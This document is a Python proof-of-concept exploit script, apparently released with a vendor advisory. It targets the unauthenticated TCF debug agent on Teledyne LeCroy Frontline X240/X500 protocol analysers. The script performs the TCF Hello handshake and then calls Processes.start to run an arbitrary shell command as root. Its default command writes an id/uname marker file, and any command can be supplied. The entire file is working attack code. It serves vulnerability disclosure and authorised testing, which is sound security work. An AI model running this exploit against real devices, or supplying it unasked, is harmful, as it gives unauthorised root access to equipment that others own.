#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-only
"""
x240_tcf_rce.py: Unauthenticated root via the Xilinx TCF debug agent.

The Frontline X240 ships the Eclipse/Xilinx Target Communication Framework (TCF) debug agent on TCP/1534. It runs as root and enforces no authentication. This PoC uses the Processes service to spawn /bin/sh with an arbitrary command line; the default command writes a marker file to /tmp so execution context can be confirmed over an independent SSH session.

Per the TCF Service Locator spec both peers exchange a Locator.Hello at channel open, and the Xilinx agent will not dispatch commands from a peer that has not sent its own Hello first, so the client Hello is sent up front.

Target  : Teledyne LeCroy Frontline X240 / X240i / X500 / X500e
Finding : Unauthenticated TCF debug agent (TCP/1534) running as root
Advisory: TDY-PSG-2026-001 (CVE pending)
Patched : WPS 4.70 Beta / device firmware update
Author  : Erwin Karincic (Dollarhyde)

Authorized testing only. Use against equipment you own or are explicitly permitted to test.

Usage:
    python x240_tcf_rce.py [host] [shell_command] [--verbose]

Verify:
    ssh support@<host> -oHostKeyAlgorithms=+ssh-rsa
    cat /tmp/x240_tcf_poc_*.txt        # 'id' line should show uid=0(root)
    ls -la /tmp/x240_tcf_poc_*.txt     # owner should be root:root
"""

import socket
import sys
import json
import time
import logging

EOM = b"\x03\x01"
VERBOSE = "--verbose" in sys.argv
if VERBOSE:
    sys.argv.remove("--verbose")

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("tcf-rce")


class TCFTimeout(Exception):
    pass


def _hex_preview(b, n=200):
    s = b[:n].replace(b"\x00", b"|").replace(EOM, b"<EOM>")
    return s.decode("utf-8", errors="replace")


class TCFClient:
    def __init__(self, host, port=1534, timeout=10.0):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        self.sock.connect((host, port))
        self.token = 0
        self.buf = b""
        self.hello_services = None

        # Announce ourselves (empty service list) so the agent starts dispatching.
        client_hello = b"E\x00Locator\x00Hello\x00[]\x00" + EOM
        if VERBOSE:
            log.info(f"    >> {_hex_preview(client_hello)}")
        self.sock.sendall(client_hello)

        self.sock.settimeout(2.0)
        try:
            while True:
                chunk = self.sock.recv(8192)
                if not chunk:
                    break
                self.buf += chunk
                if EOM in self.buf and len(chunk) < 8192:
                    break
        except (socket.timeout, TimeoutError):
            pass

        if VERBOSE and self.buf:
            log.info(f"    << {_hex_preview(self.buf, 400)}")

        while EOM in self.buf:
            idx = self.buf.index(EOM)
            msg, self.buf = self.buf[:idx], self.buf[idx + len(EOM):]
            self._maybe_capture_hello(msg)

    def _maybe_capture_hello(self, msg):
        # Event form: E <NUL> <service> <NUL> <name> <NUL> <args>
        fields = msg.split(b"\x00")
        if (len(fields) >= 4 and fields[0] == b"E"
                and fields[1] == b"Locator" and fields[2] == b"Hello"):
            try:
                self.hello_services = json.loads(fields[3].decode())
            except (json.JSONDecodeError, UnicodeDecodeError):
                pass

    def call(self, service, command, *args, timeout=10.0):
        self.token += 1
        token = str(self.token).encode()
        parts = [b"C", token, service.encode(), command.encode()]
        for a in args:
            parts.append(json.dumps(a).encode())
        msg = b"\x00".join(parts) + b"\x00" + EOM
        if VERBOSE:
            log.info(f"    >> {_hex_preview(msg)}")
        self.sock.sendall(msg)
        self.sock.settimeout(timeout)
        while True:
            while EOM not in self.buf:
                try:
                    chunk = self.sock.recv(8192)
                except (socket.timeout, TimeoutError):
                    raise TCFTimeout(f"{service}.{command} timed out after {timeout}s")
                if not chunk:
                    raise IOError("agent closed connection")
                self.buf += chunk
            idx = self.buf.index(EOM)
            reply, self.buf = self.buf[:idx], self.buf[idx + len(EOM):]
            if VERBOSE:
                log.info(f"    << {_hex_preview(reply)}")
            fields = reply.split(b"\x00")
            if fields and fields[0] == b"R" and len(fields) >= 4 and fields[1] == token:
                def _decode(b):
                    if not b:
                        return None
                    try:
                        return json.loads(b.decode())
                    except (json.JSONDecodeError, UnicodeDecodeError):
                        return b.decode(errors="replace")
                return _decode(fields[2]), _decode(fields[3])


def process_id(result):
    # The agent returns the spawned process under "ID"; some builds use "ProcessID".
    if isinstance(result, dict):
        return result.get("ID") or result.get("ProcessID")
    return None


def is_start_success(err, result):
    return err is None and process_id(result) is not None


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.240"

    ts = int(time.time())
    marker = f"/tmp/x240_tcf_poc_{ts}.txt"
    default_cmd = (
        f"( echo '=== TCF_POC_MARKER {ts} ==='; "
        f"date; id; uname -a; "
        f"echo \"agent_pid=$$\"; echo \"ppid=$PPID\" "
        f") > {marker} 2>&1"
    )
    cmd = sys.argv[2] if len(sys.argv) > 2 else default_cmd

    print()
    log.info("=" * 70)
    log.info("X240 TCF unauthenticated RCE PoC (Dollarhyde)")
    log.info("=" * 70)
    log.info(f"Target:  {host}:1534")
    log.info(f"Marker:  {marker}")
    log.info(f"Command: {cmd}")
    log.info("")

    log.info("[1] Connecting + exchanging Hello")
    try:
        tcf = TCFClient(host)
    except (OSError, TCFTimeout) as e:
        log.error(f"    Connect failed: {e}")
        sys.exit(1)
    log.info("    Connection established.")

    log.info("[2] Service set advertised by agent")
    if tcf.hello_services:
        log.info(f"    {len(tcf.hello_services)} services advertised:")
        log.info(f"      {tcf.hello_services}")
    else:
        log.warning("    Hello not captured - try --verbose to inspect wire traffic.")

    log.info("[3] Locator.getAgentID  (sanity check that command dispatch works)")
    try:
        err, agent_id = tcf.call("Locator", "getAgentID")
        log.info(f"    Agent ID: {agent_id}  (errno={err})")
    except (TCFTimeout, IOError) as e:
        log.error(f"    Sanity check failed: {e}")
        log.error("    Re-run with --verbose to see the exact wire traffic.")
        sys.exit(1)

    log.info("[4] ProcessesV1.start  (spawn /bin/sh as root)")
    try:
        err, result = tcf.call(
            "ProcessesV1", "start",
            "/tmp", "/bin/sh",
            ["sh", "-c", cmd], [],
            {"Attach": False},
        )
    except (TCFTimeout, IOError) as e:
        log.warning(f"    ProcessesV1.start raised: {e}")
        err, result = ("exception", None)
    log.info(f"    err={err}, result={result}")

    if not is_start_success(err, result):
        log.info("[4b] Falling back to legacy Processes.start (bool Attach)")
        try:
            err, result = tcf.call(
                "Processes", "start",
                "/tmp", "/bin/sh",
                ["sh", "-c", cmd], [], False,
            )
        except (TCFTimeout, IOError) as e:
            log.warning(f"    Processes.start raised: {e}")
            err, result = ("exception", None)
        log.info(f"    err={err}, result={result}")

    print()
    if is_start_success(err, result):
        log.info("=" * 70)
        log.info("EXECUTION ACCEPTED by TCF agent.")
        log.info(f"Spawned ProcessID: {process_id(result)}")
        log.info(f"Process name:      {result.get('Name')}")
        log.info("")
        log.info("Verify over an independent SSH session:")
        log.info(f"    ssh support@{host} -oHostKeyAlgorithms=+ssh-rsa")
        log.info(f"    cat {marker}")
        log.info(f"    ls -la {marker}")
        log.info("")
        log.info("Expected: file owner root:root, 'id' line shows uid=0(root).")
        log.info("=" * 70)
        sys.exit(0)
    else:
        log.error("=" * 70)
        log.error("Both Processes.start variants failed even after the Hello exchange.")
        log.error("Re-run with --verbose to see the raw wire traffic.")
        log.error("=" * 70)
        sys.exit(2)


if __name__ == "__main__":
    main()
